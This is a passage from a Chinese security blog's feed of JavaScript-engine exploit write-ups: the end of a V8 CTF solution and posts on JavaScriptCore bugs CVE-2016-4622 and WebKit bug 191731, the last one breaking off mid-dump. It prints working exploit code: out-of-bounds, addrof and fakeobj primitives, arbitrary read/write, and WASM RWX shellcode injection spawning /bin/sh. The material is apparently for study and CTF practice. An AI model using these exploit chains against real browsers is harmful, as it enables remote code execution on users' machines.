(SameValue)    ;; off heap target0x12002a1bf4ac   12c  call r100x12002a1bf4af   12f  REX.W cmpq [r13-0x10] (root (true_value)),rax0x12002a1bf4b3   133  setzl al0x12002a1bf4b6   136  movzxbl rax,rax0x12002a1bf4b9   139  imull rax,rax,0x5390x12002a1bf4bf   13f  REX.W movq rbx,[rbp-0x18]0x12002a1bf4c3   143  vmovsd xmm0,[rbx+rax*8+0xf]0x12002a1bf4c9   149  vcvttsd2si rax,xmm00x12002a1bf4cd   14d  vxorpd xmm1,xmm1,xmm10x12002a1bf4d1   151  vcvtlsi2sd xmm1,xmm1,rax0x12002a1bf4d5   155  vucomisd xmm1,xmm00x12002a1bf4d9   159  jpe 0x12002a1bf4f9  &lt;+0x179&gt;0x12002a1bf4df   15f  jnz 0x12002a1bf4f9  &lt;+0x179&gt;0x12002a1bf4e5   165  cmpl rax,0x00x12002a1bf4e8   168  jz 0x12002a1bf57d  &lt;+0x1fd&gt;0x12002a1bf4ee   16e  REX.W shlq rax, 320x12002a1bf4f2   172  REX.W movq rsp,rbp0x12002a1bf4f5   175  pop rbp0x12002a1bf4f6   176  ret 0x100x12002a1bf4f9   179  REX.W movq rax,[r13+0x6bf40] (WAAT??? What are we accessing here???)0x12002a1bf500   180  REX.W leaq rbx,[rax+0x10]0x12002a1bf504   184  REX.W cmpq [r13+0x6bf48] (WAAT??? What are we accessing here???),rbx0x12002a1bf50b   18b  jna 0x12002a1bf5a5  &lt;+0x225&gt;0x12002a1bf511   191  REX.W leaq rbx,[rax+0x10]0x12002a1bf515   195  REX.W movq [r13+0x6bf40] (WAAT??? What are we accessing here???),rbx0x12002a1bf51c   19c  REX.W addq rax,0x10x12002a1bf520   1a0  REX.W movq rbx,[r13+0x80] (root (heap_number_map))0x12002a1bf527   1a7  REX.W movq [rax-0x1],rbx0x12002a1bf52b   1ab  vmovsd [rax+0x7],xmm00x12002a1bf530   1b0  jmp 0x12002a1bf4f2  &lt;+0x172&gt;0x12002a1bf532   1b2  REX.W movq rbx,0x7f76541bddd0    ;; external reference (Runtime::StackGuard)0x12002a1bf53c   1bc  REX.W movq rsi,0x8f3c0081749    ;; object: 0x08f3c0081749 &lt;NativeContext[249]&gt;0x12002a1bf546   1c6  xorl rax,rax0x12002a1bf548   1c8  REX.W movq r10,0x7f7654a790a0  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; off heap target0x12002a1bf552   1d2  call r100x12002a1bf555   1d5  jmp 0x12002a1bf3cd  &lt;+0x4d&gt;0x12002a1bf55a   1da  REX.W movq [rbp-0x20],rax0x12002a1bf55e   1de  movl rdx,0x300x12002a1bf563   1e3  REX.W movq r10,0x7f7654768700  (AllocateInNewSpace)    ;; off heap target0x12002a1bf56d   1ed  call r100x12002a1bf570   1f0  REX.W leaq rbx,[rax-0x1]0x12002a1bf574   1f4  REX.W movq rax,[rbp-0x20]0x12002a1bf578   1f8  jmp 0x12002a1bf417  &lt;+0x97&gt;0x12002a1bf57d   1fd  vmovsd [rbp-0x18],xmm00x12002a1bf582   202  REX.W movq [rbp-0x20],rax0x12002a1bf586   206  movl rax,[rbp-0x14]0x12002a1bf589   209  cmpl rax,0x00x12002a1bf58c   20c  jl 0x12002a1bf59b  &lt;+0x21b&gt;0x12002a1bf592   212  REX.W movq rax,[rbp-0x20]0x12002a1bf596   216  jmp 0x12002a1bf4ee  &lt;+0x16e&gt;0x12002a1bf59b   21b  vmovsd xmm0,[rbp-0x18]0x12002a1bf5a0   220  jmp 0x12002a1bf4f9  &lt;+0x179&gt;0x12002a1bf5a5   225  vmovsd [rbp-0x18],xmm00x12002a1bf5aa   22a  movl rdx,0x100x12002a1bf5af   22f  REX.W movq r10,[rip+0xffffffaf]0x12002a1bf5b6   236  call r100x12002a1bf5b9   239  REX.W subq rax,0x10x12002a1bf5bd   23d  vmovsd xmm0,[rbp-0x18]0x12002a1bf5c2   242  jmp 0x12002a1bf511  &lt;+0x191&gt;0x12002a1bf5c7   247  nop0x12002a1bf5c8   248  call 0x12002a282040     ;; debug: deopt position, script offset &#39;65&#39;                                                             ;; debug: deopt position, inlining id &#39;-1&#39;                                                             ;; debug: deopt reason &#39;(unknown)&#39;                                                             ;; debug: deopt index 0                                                             ;; lazy deoptimization bailout 00x12002a1bf5cd   24d  call 0x12002a282045     ;; debug: deopt position, script offset &#39;12&#39;                                                             ;; debug: deopt position, inlining id &#39;-1&#39;                                                             ;; debug: deopt reason &#39;(unknown)&#39;                                                             ;; debug: deopt index 1                                                             ;; lazy deoptimization bailout 10x12002a1bf5d2   252  nop</code></pre><p>虽然现在实现了oob，但是非常不稳定，需要使用这个oob来扩大和稳定对V8的控制。（这个时候就不要用前面编译出来的debug版本的v8了，直接用题目提供的版本，因为我测试的时候发现我编译出来的d8泄露出来的数据不正常）</p><h3 id="OOB-RW"><a href="#OOB-RW" class="headerlink" title="OOB RW"></a>OOB RW</h3><p>一个比较简单的构造稳定oob的方法就是，在原有的oob数组后面再申请一个JSArray，然后通过已有的oob修改<code>JSArray.length</code>，于是可以构造如下代码：</p><pre><code class="javascript">var oob_arr = undefined;function foo(x) {    let o = {mz: -0};    let i = Object.is(Math.expm1(x), o.mz); // i = 0    i *= 14; // Feedback i = 0; slot 14 is the b.length    let a = [0.1, 0.2, 0.3, 0.4, 0.5];    let b = [1.1, 1.2, 1.3, 1.4];    oob_arr = b;    a[i] = i2f(0x111100000000); // Modify length of oob_arr to make a out-of-bounds.    return a[i];}</code></pre><h3 id="Addrof"><a href="#Addrof" class="headerlink" title="Addrof()"></a>Addrof()</h3><p>之后再在后面申请一个普通对象<code>var victim = {prop:{}};</code>，通过victim来完成<code>addrof()</code>的构造：</p><pre><code class="javascript">function addrof(obj){    victim.prop = obj;    return f2i(oob_arr[0x1f]);}</code></pre><h3 id="Arbitrary-Read-Write"><a href="#Arbitrary-Read-Write" class="headerlink" title="Arbitrary Read/Write"></a>Arbitrary Read/Write</h3><p><code>fakeobj()</code>可以不用，因为我们可以通过第二个oob直接构造出Arbitrary Read/Write，方法就是在victim后面接着再申请一个<code>ArrayBuffer</code>，然后通过oob修改<code>JSArrayBuffer.BackingStore</code>指针：</p><pre><code class="javascript">var arb_buf = new ArrayBuffer(0x100);function read64(addr){    oob_arr[0x31] = i2f(addr);    let buf_f64 = new Float64Array(arb_buf);    return f2i(buf_f64[0]);}function arb_write(addr, content){    oob_arr[0x31] = i2f(addr);    if(typeof content == &quot;number&quot;){        let buf_f64 = new Float64Array(arb_buf);        buf_f64[0] = i2f(content);    }else if(typeof content == &quot;string&quot;){        let buf_u8 = new Uint8Array(arb_buf);        for(let i=0, len=content.length; i&lt;len; i++){            buf_u8[i] = content[i].charCodeAt();        }    }}</code></pre><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>通过WASM构造出RWX memory，然后泄露出RWX memory的地址再写入shellcode就可以很轻松地RCE：</p><pre><code class="javascript">var pwn = {    getRWXMem : function(){        let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);        let wasmModule = new WebAssembly.Module(wasmCode);        let wasmInstance = new WebAssembly.Instance(wasmModule);        let shellcodeFunc = wasmInstance.exports.main;        let shellcodeAddr = addrof(shellcodeFunc);        shellcodeAddr = read64(shellcodeAddr-1+8*3);        shellcodeAddr = read64(shellcodeAddr-1+8*1);        shellcodeAddr = read64(shellcodeAddr-1+8*2);        shellcodeAddr = read64(shellcodeAddr-1+8*0x1d);        return [shellcodeFunc, shellcodeAddr];    },    start : function(){        let shellcodeObj = this.getRWXMem();        let shellcodeAddr = shellcodeObj[1];        let shellcodeFunc = shellcodeObj[0];        let shellcode = &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05&quot;;        print(&quot;[*] Get RWX memory address : &quot;+hex(shellcodeAddr));        print(&quot;[*] Injecting shellcode...&quot;);        arb_write(shellcodeAddr, shellcode);        print(&quot;[*] Remote code execute...&quot;);        shellcodeFunc();    }};pwn.start();</code></pre><p>以上代码测试的时候因为带上了<code>--allow-natives-syntax</code>，所以一些偏移和不带参数的可能不太一样。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Browser </tag>
            
            <tag> JavascriptEngine </tag>
            
            <tag> Chrome </tag>
            
            <tag> V8 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript engine exploit 3</title>
      <link href="/2019/10/30/Javascript-engine-exploit-3/"/>
      <url>/2019/10/30/Javascript-engine-exploit-3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/183882" target="_blank" rel="noopener">首发于安全客：https://www.anquanke.com/post/id/183882</a></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这次准备介绍一个经典的bug：<a href="https://www.zerodayinitiative.com/advisories/ZDI-16-485/" target="_blank" rel="noopener">CVE 2016 4622</a></p><p>这个bug也是第一篇介绍到的文章<a href="http://phrack.com/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">Attacking JavaScript Engines</a>中提到的，saelo在文章中对漏洞相关的技术介绍得很清楚，网上也有很多人对这个漏洞进行了复现，我没有在前面对这个漏洞进行介绍是因为这个洞算是比较老了（其实主要是在我机器上编译不了）。</p><p>但是前段时间看到了一篇文章：<a href="http://d1iv3.me/2019/07/06/WebKit-JSC-CVE-2016-4622%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">WebKit JSC CVE-2016-4622调试分析</a></p><p>发现还是有人遇到了同样的情况，文章中给出了在新分支中打上vuln patch的方式，patch的方案和文件来源：<a href="https://github.com/m1ghtym0/write-ups/tree/master/browser/CVE-2016-4622" target="_blank" rel="noopener">https://github.com/m1ghtym0/write-ups/tree/master/browser/CVE-2016-4622</a></p><h3 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h3><pre><code class="javascript">var a = [];for (var i = 0; i &lt; 100; i++)    a.push(i + 0.123);var b = a.slice(0, {      valueOf: function() {        a.length = 0;       return 10;       }    });print(b);//0.123,1.123,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314</code></pre><h3 id="0x02-Slice"><a href="#0x02-Slice" class="headerlink" title="0x02 Slice"></a>0x02 Slice</h3><p>poc很简洁，这是一个数组越界访问（OOB）的漏洞。漏洞出现在<code>Array.prototype.slice</code>的实现中，具体的函数是<code>arrayProtoFuncSlice</code>：</p><pre><code class="javascript">EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)    {      /* [[ 1 ]] */      JSObject* thisObj = exec-&gt;thisValue()                         .toThis(exec, StrictMode)                         .toObject(exec);      if (!thisObj)        return JSValue::encode(JSValue());      /* [[ 2 ]] */      unsigned length = getLength(exec, thisObj);      if (exec-&gt;hadException())        return JSValue::encode(jsUndefined());      /* [[ 3 ]] */      unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);      unsigned end =          argumentClampedIndexFromStartOrEnd(exec, 1, length, length);      /* [[ 4 ]] */      std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult =        speciesConstructArray(exec, thisObj, end - begin);      // We can only get an exception if we call some user function.      if (UNLIKELY(speciesResult.first ==      SpeciesConstructResult::Exception))        return JSValue::encode(jsUndefined());      /* [[ 5 ]] */      if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp;            isJSArray(thisObj))) {        if (JSArray* result =                asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))          return JSValue::encode(result);      }      JSObject* result;      if (speciesResult.first == SpeciesConstructResult::CreatedObject)        result = speciesResult.second;      else        result = constructEmptyArray(exec, nullptr, end - begin);      unsigned n = 0;      for (unsigned k = begin; k &lt; end; k++, n++) {        JSValue v = getProperty(exec, thisObj, k);        if (exec-&gt;hadException())          return JSValue::encode(jsUndefined());        if (v)          result-&gt;putDirectIndex(exec, n, v);      }      setLength(exec, result, n);      return JSValue::encode(result);    }</code></pre><ol><li>取得调用方法的对象（在这里是数组对象）</li><li>得到数组的length</li><li>对参数进行转换得到start和end的index，并将它们限制在[0, length)的区间内</li><li>检查是否有构造函数可使用</li><li>执行切片</li></ol><p>最后执行切片一共有两种方式：</p><ol><li>如果是密集型存储的数组就执行<code>fastSlice</code>，使用<code>memcpy</code>拷贝数据到新数组。</li><li>如果<code>fastSlice</code>无法执行，就使用<code>slowSlice</code>，使用一个循环将元素一个一个放入新数组。</li></ol><p>值得注意的是在<code>fastSlice</code>中没有对数组边界的检查，看起来在前面的代码中已经对start和end的范围做了限制，所以很容易地认为在后面的代码中不会有数组越界的情况发生，但是saelo在文章中使用类型转换突破了这个限制。</p><h3 id="0x03-ValueOf"><a href="#0x03-ValueOf" class="headerlink" title="0x03 ValueOf"></a>0x03 ValueOf</h3><p>JavaScript属于“动态弱类型”语言，JavaScript在处理不同类型变量时会尝试去把变量转化成自己需要的类型，以<code>Math.abs()</code>为例：</p><pre><code class="javascript">&gt;&gt;&gt; Math.abs(-42)42&gt;&gt;&gt; Math.abs(&quot;-42&quot;)42&gt;&gt;&gt; Math.abs([])0&gt;&gt;&gt; Math.abs(true)1&gt;&gt;&gt; Math.abs({})NaN&gt;&gt;&gt; </code></pre><p>但是这种用法不适用于强类型语言，比如Python（Python属于“动态强类型”语言）。</p><p>如果一个对象有可以调用的<code>valueOf()</code>方法，当需要做类型转换时会获取这个方法的返回值作为转换的结果：</p><pre><code class="javascript">&gt;&gt;&gt; Math.abs({valueOf:function(){return 10;}})10</code></pre><p>有时候<code>toString()</code>也是有效的：</p><pre><code class="javascript">&gt;&gt;&gt; Math.abs({toString:function(){return &quot;10&quot;;}})10</code></pre><p>这也是为什么在poc中要给<code>slice()</code>传入带<code>valueOf()</code>方法的对象。</p><pre><code class="javascript">var b = a.slice(0, {      valueOf: function() {        a.length = 0;       return 10;       }    });</code></pre><p>表面上等效于：</p><pre><code class="javascript">var b = a.slice(0, 10);</code></pre><h3 id="0x04-Exploiting-with-“valueOf”"><a href="#0x04-Exploiting-with-“valueOf”" class="headerlink" title="0x04 Exploiting with “valueOf”"></a>0x04 Exploiting with “valueOf”</h3><p><code>arrayProtoFuncSlice()</code>中的参数类型转换发生在<code>argumentClampedIndexFromStartOrEnd()</code>执行的时候，该方法负责将start和end限制在[0, length)区间。</p><pre><code class="cpp">    JSValue value = exec-&gt;argument(argument);    if (value.isUndefined())        return undefinedValue;    double indexDouble = value.toInteger(exec);  // Conversion happens here    if (indexDouble &lt; 0) {        indexDouble += length;        return indexDouble &lt; 0 ? 0 : static_cast&lt;unsigned&gt;(indexDouble);    }    return indexDouble &gt; length ? length : static_cast&lt;unsigned&gt;(indexDouble);</code></pre><p>这段代码有个很明显的问题，这里用的<code>length</code>是前面获取到的，如果我们在类型转换时将数组实际的<code>length</code>缩小，由于这里的length不会更新，start和end表示的范围将会突破数组长度的限制。</p><p>再来看看重新设定数组长度之后会发生什么，具体的代码在<code>JSArray::setLength</code>：</p><pre><code class="cpp">    unsigned lengthToClear = butterfly-&gt;publicLength() - newLength;    unsigned costToAllocateNewButterfly = 64; // a heuristic.    if (lengthToClear &gt; newLength &amp;&amp;        lengthToClear &gt; costToAllocateNewButterfly) {        reallocateAndShrinkButterfly(exec-&gt;vm(), newLength);        return true;    }</code></pre><p>中间设置了一个<code>costToAllocateNewButterfly</code>是用来避免频繁申请内存空间的。</p><p>解读下这段代码的意思：<code>new length</code>减去<code>old length</code>的差值如果大于<code>new length</code>而且大于<code>costToAllocateNewButterfly</code>，就会为数组重新申请<code>butterfly</code>的内存。这里的<code>length</code>表示的不是字节数，而是slot的数量，也就是元素个数。</p><p>结合这部分的内容就很容易知道poc中打印出来的<code>b</code>的内容大概是什么了。就是<code>a</code>重新分配的<code>butterfly</code>紧挨着的内存区域的数据。但是我们仍然不知道泄漏出来的数据具体是什么，属于哪个对象。</p><h3 id="0x05-JavaScriptCore-Heap"><a href="#0x05-JavaScriptCore-Heap" class="headerlink" title="0x05 JavaScriptCore Heap"></a>0x05 JavaScriptCore Heap</h3><p>Butterfly的分配是在JSC的Heap中进行的，对于大小相近的Butterfly，他们会被分配到一片连续的内存空间中：</p><pre><code class="javascript">a = [1.1];a[0] = 1.8;print(describe(a));b = [{}];print(describe(b));</code></pre><pre><code class="shell">Object: 0x1072b42b0 with butterfly 0x8000fe4a8 (Structure 0x1072f2a00:[Array, {}, ArrayWithDouble, Proto:0x1072c80a0, Leaf]), StructureID: 97Object: 0x1072b42c0 with butterfly 0x8000fe4c8 (Structure 0x1072f2a70:[Array, {}, ArrayWithContiguous, Proto:0x1072c80a0]), StructureID: 98</code></pre><p>可以看到两个Array的Butterfly是连在一起的，这个对于长度被缩小后内存被重新分配的Array也是一样的：</p><pre><code class="javascript">a = [];for (var i = 0; i &lt; 100; i++)     a.push(i + 0.123);a.length = 0;print(describe(a));b = [{}];print(describe(b));</code></pre><pre><code class="shell">Object: 0x106ab42b0 with butterfly 0x8000fe4a8 (Structure 0x106af2a00:[Array, {}, ArrayWithDouble, Proto:0x106ac80a0, Leaf]), StructureID: 97Object: 0x106ab42c0 with butterfly 0x8000fe4c8 (Structure 0x106af2a70:[Array, {}, ArrayWithContiguous, Proto:0x106ac80a0]), StructureID: 98</code></pre><p>那我们就可以很清楚的知道，前面通过POC泄漏出来的数据就是其他对象的butterfly。那么如果我们收缩Array之后紧接着分配一个大小相近的Array，就应该可以读取到第二个Array的butterfly了，如果里面保存的是对象那么我们就可以泄漏这个对象的地址了。</p><h3 id="0x06-Addrof"><a href="#0x06-Addrof" class="headerlink" title="0x06 Addrof"></a>0x06 Addrof</h3><p>结合POC：</p><pre><code class="javascript">a = [];for (var i = 0; i &lt; 100; i++)     a.push(i + 0.123);b = a.slice(0, {        valueOf: function() {            a.length = 0;             var leak_ary = [{}];            print(describe(a));            print(describe(leak_ary[0]));            return 10;         }    });print(describe(b));</code></pre><pre><code class="shell">#aObject: 0x1071b42b0 with butterfly 0x10000fe4a8 (Structure 0x1071f2a00:[Array, {}, ArrayWithDouble, Proto:0x1071c80a0, Leaf]), StructureID: 97#leak_aryObject: 0x1071b0080 with butterfly 0x0 (Structure 0x1071f2060:[Object, {}, NonArray, Proto:0x1071b4000]), StructureID: 75#bObject: 0x1071b42d0 with butterfly 0x10000e0078 (Structure 0x1071f2a00:[Array, {}, ArrayWithDouble, Proto:0x1071c80a0, Leaf]), StructureID: 97&gt;&gt;&gt; b0.123,1.123,1.5488838078e-314,6.3659873734e-314,2.180893412e-314,0,0,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314(lldb) x/6gx 0x10000e00780x10000e0078: 0x3fbf7ced916872b0 0x3ff1f7ced916872b0x10000e0088: 0x00000000badbeef0 0x00000003000000010x10000e0098: 0x00000001071b0080 0x0000000000000000</code></pre><p>通过查看<code>b</code>的butterfly可以看到里面已经保存了<code>leak_ary</code>的地址。通过直接输出<code>b</code>，我们获取第五个元素就可以得到泄漏出的对象地址了。封装<code>addrof()</code>如下：</p><pre><code class="javascript">function addrof(obj){    var a = [];    for (var i = 0; i &lt; 100; i++)         a.push(i + 0.123);    var b = a.slice(0, {            valueOf: function() {                a.length = 0;                 var leak_ary = [obj];                return 10;             }        }    );    return b[4];}</code></pre><h3 id="0x07-Fakeobj"><a href="#0x07-Fakeobj" class="headerlink" title="0x07 Fakeobj"></a>0x07 Fakeobj</h3><p>伪造对象也可以通过这个<code>oob</code>漏洞完成，和<code>addrof()</code>的区别就是，我们需要先将<code>a</code>转化为<code>ArrayWithContigous</code>，在<code>a</code>缩小之后，申请一个<code>ArrayWithDouble</code>，并将要伪造的对象地址写进去，构造如下：</p><pre><code class="javascript">function fakeobj(addr){    var a = [];    for (var i = 0; i &lt; 100; i++)         a.push(i + 0.123);    var b = a.slice(0, {            valueOf: function() {                a.length = 0;                a[0] = {};                var arr = [1.1];                arr[0] = addr;                return 10;             }        }    );    return b[4];}</code></pre><p>我构造出来的<code>addrof()</code>和<code>fakeobj()</code>会和saelo的不太一样，因为我是根据自己对漏洞的理解写的，saelo的构造比我更加简洁：</p><p><strong>addrof@saelo</strong>：</p><pre><code class="javascript">function addrof(object) {        var a = [];        for (var i = 0; i &lt; 100; i++)            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles        var hax = {valueOf: function() {            a.length = 0;            a = [object];            return 4;        }};        var b = a.slice(0, hax);        return Int64.fromDouble(b[3]);}</code></pre><p><strong>fakeobj@saelo</strong>：</p><pre><code class="javascript">function fakeobj(addr) {        var a = [];        for (var i = 0; i &lt; 100; i++)            a.push({});     // Array must be of type ArrayWithContiguous        addr = addr.asDouble();        var hax = {valueOf: function() {            a.length = 0;            a = [addr];            return 4;        }};        return a.slice(0, hax)[3];}</code></pre><h3 id="0x08-Exploit"><a href="#0x08-Exploit" class="headerlink" title="0x08 Exploit"></a>0x08 Exploit</h3><p>由于JSC在新加入了2016年并没有的漏洞缓解措施“Gigacage”，导致无法修改特定对象的<code>m_vector</code>的指针，比如<code>Float64Array</code>，所以saelo文章中的利用方法不适用于本文中打了patch的JSC，其实我们完全可以用上一篇文章中的利用方法，直接将除了<code>addrof()</code>和<code>fakeobj()</code>的部分复制过来就能用了。</p><p>当然这样有些不兼容的问题，我在代码中做了一些调整：<a href="https://github.com/joshua7o8v/Browser/blob/master/WebKit/cve-2016-4622/poc.js" target="_blank" rel="noopener">https://github.com/joshua7o8v/Browser/blob/master/WebKit/cve-2016-4622/poc.js</a></p><p>关于<code>poc.js</code>中不太理解的地方可以看上一篇文章。</p><h3 id="0x09-Reference"><a href="#0x09-Reference" class="headerlink" title="0x09 Reference"></a>0x09 Reference</h3><p>[1] <a href="https://github.com/joshua7o8v/Browser/tree/master/WebKit/cve-2016-4622" target="_blank" rel="noopener">https://github.com/joshua7o8v/Browser/tree/master/WebKit/cve-2016-4622</a></p><p>[2] <a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://www.phrack.org/papers/attacking_javascript_engines.html</a></p><p>[3] <a href="http://d1iv3.me/2019/07/06/WebKit-JSC-CVE-2016-4622%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://d1iv3.me/2019/07/06/WebKit-JSC-CVE-2016-4622%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Browser </tag>
            
            <tag> JavascriptEngine </tag>
            
            <tag> JavascriptCore </tag>
            
            <tag> Webkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript engine exploit 2</title>
      <link href="/2019/10/30/Javascript-engine-exploit-2/"/>
      <url>/2019/10/30/Javascript-engine-exploit-2/</url>
      
        <content type="html"><![CDATA[<p> <a href="https://www.anquanke.com/post/id/183805" target="_blank" rel="noopener">首发于安全客：https://www.anquanke.com/post/id/183805</a></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这是2018年底的一个关于正则的bug，编号是191731。</p><p>关于这个Bug的描述和Diff：<a href="https://bugs.webkit.org/show_bug.cgi?id=191731" target="_blank" rel="noopener">About The Bug</a>、<a href="https://github.com/WebKit/webkit/commit/7cf9d2911af9f255e0301ea16604c9fa4af340e2?diff=split#diff-fb5fbac6e9d7542468cfeed930e241c0L66" target="_blank" rel="noopener">Diff</a></p><p>切换到漏洞分支编译：</p><pre><code class="bash">git checkout 3af5ce129e6636350a887d01237a65c2fce77823</code></pre><h3 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h3><pre><code class="javascript">var victim_array = [1.1];var reg = /abc/y;var val = 5.2900040263529e-310var funcToJIT = function() {    &#39;abc&#39;.match(reg);    victim_array[0] = val;}for (var i = 0; i &lt; 10000; ++i){    funcToJIT()}regexLastIndex = {};regexLastIndex.toString = function() {    victim_array[0] = {};    return &quot;0&quot;;};reg.lastIndex = regexLastIndex;funcToJIT()print(victim_array[0])</code></pre><p>直接用jsc运行的话会崩溃：</p><pre><code class="bash">$ ./WebKit.git/WebKitBuild/Debug/bin/jsc ./bug_191731/test/poc.js[1]    37939 segmentation fault  ./WebKit.git/WebKitBuild/Debug/bin/jsc ./bug_191731/test/poc.js</code></pre><p>可以用lldb加载jsc运行再看看：</p><pre><code class="bash">$ lldb ./WebKitBuild/Debug/bin/jsc(lldb) target create &quot;./WebKitBuild/Debug/bin/jsc&quot;Current executable set to &#39;./WebKitBuild/Debug/bin/jsc&#39; (x86_64).(lldb) run -i ../bug_191731/test/poc.jsProcess 37993 stopped* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x616161616166)    frame #0: 0x000000010000b90c jsc`JSC::JSCell::isString(this=0x0000616161616161) const at JSCellInlines.h:203:12   200   201     inline bool JSCell::isString() const   202     {-&gt; 203         return m_type == StringType;   204     }   205   206     inline bool JSCell::isBigInt() constTarget 0: (jsc) stopped.</code></pre><p>这里引用了一个<code>this</code>，<code>this=0x0000616161616161</code>，这个数据的来源是POC中的val。</p><p>这里很明显传入了一个double，但是取出来的却是一个对象，然后引用这个对象的时候造成了崩溃。这里简单叙述一下POC的过程：</p><ol><li>初始化一个Double数组。</li><li>初始化一个正则表达式对象，而且一定要加上<code>/y</code>标识。</li><li>随意初始化一个double变量。</li><li>创建一个函数，函数体内执行正则匹配，并对<code>victim_array[0]</code>传入double值。</li><li>让第四步创建的函数循环一万次，以触发JIT对它进行优化编译。</li><li>创建一个对象，重写该对象的<code>toString</code>方法，该方法给<code>victim_array[0]</code>赋值一个对象。</li><li>将<code>reg</code>的<code>lastIndex</code>属性赋值为刚创建的对象。</li><li>调用<code>funcToJIT</code>触发<code>toString</code>将<code>victim_array</code>转化为<code>JSValue</code>数组，然后放入val的值。</li><li>打印<code>victim_array[0]</code>触发对伪造对象的引用，引起崩溃。</li></ol><p>上面提到了一定要加上<code>/y</code>标识，这是因为每个正则对象都有一个<code>lastIndex</code>属性，每次进行匹配的时候都会读取这个属性作为匹配字符串的开头，如果<code>lastIndex</code>为0就是从字符串开头进行匹配，如果<code>lastIndex</code>为1就是从第二个字符开始进行匹配。加上<code>/y</code>之后，正则对象每次都会读取这个值作为开头，而且不管匹配是否成功，都会将<code>lastIndex</code>设置为上一次匹配结束的位置。</p><p>但是<code>/g</code>也会读取<code>lastIndex</code>，为什么不用<code>/g</code>？因为<code>/g</code>修饰过的正则每次匹配必须从字符串开头进行，我猜测可能是每次匹配开始时都会将<code>lastIndex</code>设置为0，这就导致我们没法利用这个属性，因为每次重写都会被覆盖为0。</p><p>这个POC的关键点在于，最后传入val的时候，JSC为什么不认为<code>val</code>是double类型，而认为它是一个对象？</p><p>在最后执行<code>funcToJIT()</code>之前：</p><pre><code class="shell">&gt;&gt;&gt; describe(victim_array)Object: 0x108ab4340 with butterfly 0x8000fe6a8 (Structure 0x108af2a70:[Array, {}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 98</code></pre><p>执行完成后：</p><pre><code class="shell">&gt;&gt;&gt; describe(victim_array)Object: 0x108ab4340 with butterfly 0x8000fe6a8 (Structure 0x108af2ae0:[Array, {}, ArrayWithContiguous, Proto:0x108ac80a0]), StructureID: 99</code></pre><p>问题就出在<code>funcToJIT</code>中，我们可以认为这个函数执行了两个步骤，一个是执行<code>toString</code>，另一个就是<code>victim_array[0] = val</code>。<code>toString</code>中执行<code>victim_array[0] = {}</code>，这一步JSC就将数组变成了<code>ArrayWithContigous</code>，说明JSC是知道传入了一个对象的。而执行<code>victim_array[0] = val</code>的时候，JSC就没认为它是一个double。这是因为<code>funcToJIT()</code>被JIT优化了，导致JSC没有对val的类型进行检查，也就没有对我们传入的值进行编码，我设置的<code>val=0x616161616161</code>，编码之后应该是<code>0x1616161616161</code>，这里没有编码，传进去之后就是原来的值，然而此时数组已经是<code>ArrayWithContigous</code>，根据JSC的<code>NaN-boxing</code>规则，<code>0x616161616161</code>就是一个指针。</p><p>double传入<code>ArrayWithDouble</code>-正常：</p><pre><code class="shell">(lldb) x/10gx 0x10000fe6c80x10000fe6c8: 0x0000616161616161 0x00000000badbeef00x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6f8: 0x00000000badbeef0 0x00000000badbeef00x10000fe708: 0x00000000badbeef0 0x00000000badbeef0</code></pre><p>double传入<code>ArrayWithContigous</code>-正常：</p><pre><code class="shell">(lldb) x/10gx 0x10000fe6a80x10000fe6a8: 0x0001616161616161 0x00000000badbeef00x10000fe6b8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6c8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef0</code></pre><p>double传入<code>ArrayWithContigous</code>-POC：</p><pre><code class="shell">(lldb) x/10gx 0x10000fe6a80x10000fe6a8: 0x0000616161616161 0x00000000badbeef00x10000fe6b8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6c8: 0x00000000badbeef0 